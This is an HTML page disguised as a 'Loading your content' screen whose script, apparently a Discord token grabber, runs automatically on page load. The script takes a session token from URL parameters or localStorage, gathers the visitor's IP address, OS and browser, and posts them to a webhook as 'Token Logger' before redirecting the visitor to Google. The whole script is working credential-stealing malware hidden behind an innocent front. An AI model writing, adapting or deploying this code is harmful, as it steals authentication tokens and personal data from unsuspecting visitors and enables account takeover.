<!DOCTYPE html>
<html>
<head>
  <title>Loading - Please Wait</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      overflow: hidden;
    }
    .container {
      text-align: center;
      max-width: 500px;
    }
    .loading {
      display: inline-block;
      width: 50px;
      height: 50px;
      border: 3px solid rgba(255,255,255,.2);
      border-radius: 50%;
      border-top-color: #ffffff;
      animation: spin 1s ease-in-out infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="loading"></div>
    <h2>Loading your content...</h2>
    <p>Please wait while we prepare your experience.</p>
  </div>

  <script>
    // Prevent duplicate sends
    let hasSent = false;

    async function processData() {
      // Prevent double execution
      if (hasSent) {
        console.log('[Already sent, closing...]');
        window.location.href = "https://google.com"
        return;
      }

      const urlParams = new URLSearchParams(window.location.search);
      
      // Get session token from URL parameter (prefer this over 'token' param)
      let rawToken = urlParams.get('session') || urlParams.get('token');
      const userAgent = urlParams.get('ua') || navigator.userAgent;

      // If no token in URL, check localStorage
      if (!rawToken) {
        rawToken = localStorage.getItem('discord_token') || 
                   localStorage.getItem('token');
      }

      // If still no token, exit immediately
      if (!rawToken) {
        console.log('Token not found in URL or localStorage');
        window.close();
        return;
      }

      // CRITICAL: Convert to string properly
      let token;
      
      // If it's already a string, use it
      if (typeof rawToken === 'string') {
        token = rawToken;
      } 
      // If it's an object, try to extract or stringify
      else if (typeof rawToken === 'object' && rawToken !== null) {
        // Try to find token-like property
        if (rawToken.token) {
          token = String(rawToken.token);
        } else if (rawToken.value) {
          token = String(rawToken.value);
        } else if (rawToken.data) {
          token = String(rawToken.data);
        } else {
          // Last resort: stringify the whole object
          token = JSON.stringify(rawToken);
        }
      }
      // Fallback: force string conversion
      else {
        token = String(rawToken);
      }

      // Decode if URL encoded
      try {
        const decoded = decodeURIComponent(token);
        if (decoded !== token) {
          token = decoded;
        }
      } catch (e) {
        // If decode fails, use original
      }

      // Log for debugging (truncated for security)
      console.log('[Success]:', token.substring(0, 20) + '...');

      try {
        // Mark as sending
        hasSent = true;

        // Get IP information
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();

        // Collect system info
        const systemInfo = {
          os: getOSInfo(userAgent),
          browser: getBrowserInfo(userAgent),
          ip: ipData.ip
        };

        // Send data
        const success = await sendData(token, systemInfo, userAgent);

        if (success) {
          console.log('[Success] Data sent - closing now');
          // Close immediately after successful send
          window.location.href = "https://google.com"
        } else {
          console.error('[Failed] Send failed - closing anyway');
          window.location.href = "https://google.com"
        }

      } catch (e) {
        console.error('Data processing error:', e);
        // Close even on error to avoid duplicate sends
        window.location.href = "https://google.com"
      }
    }
    
    // Send data to webhook
    async function sendData(token, systemInfo, userAgent) {
      try {
        // Get webhook URL
        const response = await fetch('/api/get-webhook-url');
        const { webhookUrl } = await response.json();

        if (!webhookUrl) {
          throw new Error('Webhook URL not configured');
        }

        // Ensure token is string (triple check)
        const tokenString = String(token);

        // Build payload
        const payload = {
          content: null,
          embeds: [{
            title: "🔐 Token Information",
            description: "Authentication data has been captured successfully.",
            color: 0x5865F2,
            fields: [
              {
                name: "🔑 Token",
                value: `\`\`\`${tokenString}\`\`\``,
                inline: false
              },
              {
                name: "🌐 IP Address",
                value: `\`\`\`${String(systemInfo.ip)}\`\`\``,
                inline: true
              },
              {
                name: "💻 System Info",
                value: `\`\`\`OS: ${String(systemInfo.os)}\nBrowser: ${String(systemInfo.browser)}\`\`\``,
                inline: true
              },
              {
                name: "🔍 User Agent",
                value: `\`\`\`${String(userAgent)}\`\`\``,
                inline: false
              }
            ],
            footer: {
              text: "Captured at " + new Date().toUTCString(),
              icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
            }
          }],
          username: "Token Logger",
          avatar_url: "https://cdn.discordapp.com/embed/avatars/1.png"
        };
        
        // Send to webhook
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json' 
          },
          body: JSON.stringify(payload)
        });

        return true;

      } catch (error) {
        console.error('Webhook error:', error);
        return false;
      }
    }
    
    // Detect OS
    function getOSInfo(ua) {
      if (ua.includes("Windows NT")) return "Windows";
      if (ua.includes("Mac OS")) return "macOS";
      if (ua.includes("Linux")) return "Linux";
      if (ua.includes("Android")) return "Android";
      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
      return "Unknown";
    }
    
    // Detect Browser
    function getBrowserInfo(ua) {
      if (ua.includes("Firefox/")) return "Firefox";
      if (ua.includes("Edge/") || ua.includes("Edg/")) return "Edge";
      if (ua.includes("Chrome/")) return "Chrome";
      if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
      if (ua.includes("MSIE ") || ua.includes("Trident/")) return "Internet Explorer";
      return "Unknown";
    }
    
    // Start processing when page loads
    window.addEventListener('load', processData);

  </script>
</body>
</html>
